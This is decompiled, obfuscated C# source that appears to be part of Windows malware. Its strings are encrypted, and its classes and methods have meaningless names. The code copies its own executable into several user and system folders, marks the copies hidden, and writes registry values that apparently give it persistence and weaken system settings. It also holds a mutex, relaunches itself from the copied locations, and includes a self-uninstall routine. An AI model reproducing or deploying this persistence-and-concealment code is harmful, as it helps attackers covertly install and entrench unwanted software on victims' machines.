using System;
using System.Diagnostics;
using System.IO;
using System.Threading;
using Microsoft.Win32;
using ns1;
using ns2;

namespace ns0;

internal class Class1 : Class0
{
	private static Mutex mutex_0;

	public static RegistryKey registryKey_0;

	public static void smethod_4()
	{
		Class2.smethod_0();
		if (string.Join(Convert.ToString(32), Class8.string_0) == _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_14())
		{
			Process.Start(Class2.string_4);
			Environment.Exit(0);
		}
		if (Class2.bool_0)
		{
			registryKey_0 = Registry.LocalMachine;
		}
		else
		{
			registryKey_0 = Registry.CurrentUser;
		}
		Class2.string_3[2] = _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_15() + new Guid(Class2.uI).ToString().ToUpper() + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_16();
		try
		{
			Registry.CurrentUser.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_17(), writable: true)!.DeleteSubKey(Class2.string_3[2]);
		}
		catch
		{
		}
		smethod_10();
		smethod_9();
		smethod_5();
		Class0.smethod_0();
		Class5.smethod_0();
		Class3.smethod_0();
	}

	private static void smethod_5()
	{
		if (Class2.bool_0)
		{
			Class2.string_2[0] = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_6() + Class2.string_2[0];
			Class2.string_2[1] = Environment.GetFolderPath(Environment.SpecialFolder.CommonProgramFiles) + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_6() + Class2.string_2[1];
		}
		else
		{
			Class2.string_2[0] = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_6() + Class2.string_2[0];
			Class2.string_2[1] = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_6() + Class2.string_2[1];
		}
		if (!smethod_8())
		{
			try
			{
				string[] string_ = Class2.string_2;
				foreach (string text in string_)
				{
					if (!Class12.smethod_2(text))
					{
						File.Copy(Class2.string_4, text);
						File.SetAttributes(text, FileAttributes.Hidden);
					}
				}
			}
			catch
			{
			}
			try
			{
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_8()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_8());
				}
				if (registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_9()) == null)
				{
					registryKey_0.CreateSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_9());
				}
				if (Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_10() + Class2.string_3[2]) == null)
				{
					Registry.LocalMachine.CreateSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_10() + Class2.string_3[2]);
				}
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_8(), writable: true)!.SetValue(Class2.string_3[0], Class2.string_2[0]);
				registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_9(), writable: true)!.SetValue(Class2.string_3[1], Class2.string_2[1]);
				using RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_10() + Class2.string_3[2], writable: true);
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_11(), Class2.string_2[0] + _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_12());
				registryKey.SetValue(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_13(), 1, RegistryValueKind.DWord);
			}
			catch
			{
			}
		}
		if (!(Class2.string_4 != Class2.string_2[0]) || !(Class2.string_4 != Class2.string_2[1]))
		{
			return;
		}
		try
		{
			mutex_0.Close();
			string[] string_2 = Class2.string_2;
			foreach (string text2 in string_2)
			{
				Process.Start(text2, string.Empty);
			}
		}
		catch
		{
		}
		Environment.Exit(0);
	}

	public static void smethod_6(string string_0)
	{
		smethod_7();
		if (!Class12.smethod_8(string_0))
		{
			Process.Start(Class2.string_4);
		}
		Environment.Exit(0);
	}

	private static void smethod_7()
	{
		Class0.smethod_1();
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_8(), writable: true)!.DeleteValue(Class2.string_3[0]);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_9(), writable: true)!.DeleteValue(Class2.string_3[1]);
			Registry.LocalMachine.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_17(), writable: true)!.DeleteSubKey(Class2.string_3[2]);
		}
		catch
		{
		}
		try
		{
			string[] string_ = Class2.string_2;
			foreach (string path in string_)
			{
				File.Delete(path);
			}
		}
		catch
		{
		}
		try
		{
			mutex_0.Close();
		}
		catch
		{
		}
	}

	private static bool smethod_8()
	{
		string[] string_ = Class2.string_2;
		int num = 0;
		while (true)
		{
			if (num < string_.Length)
			{
				string string_2 = string_[num];
				if (!Class12.smethod_2(string_2))
				{
					break;
				}
				num++;
				continue;
			}
			return true;
		}
		return false;
	}

	private static void smethod_9()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_18(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_19(), _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_20(), RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_18(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_21(), _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_22(), RegistryValueKind.DWord);
			registryKey_0.OpenSubKey(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_23(), writable: true)!.SetValue(_003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_24(), _003CPrivateImplementationDetails_003E_007BF5B49754_002D4EB9_002D4C00_002DBB11_002D3C96CAB5A910_007D.smethod_22(), RegistryValueKind.DWord);
		}
		catch
		{
		}
	}

	private static void smethod_10()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			mutex_0 = new Mutex(initiallyOwned: true, Class2.uI);
			mutex_0.ReleaseMutex();
		}
		catch
		{
			Environment.Exit(0);
		}
	}
}
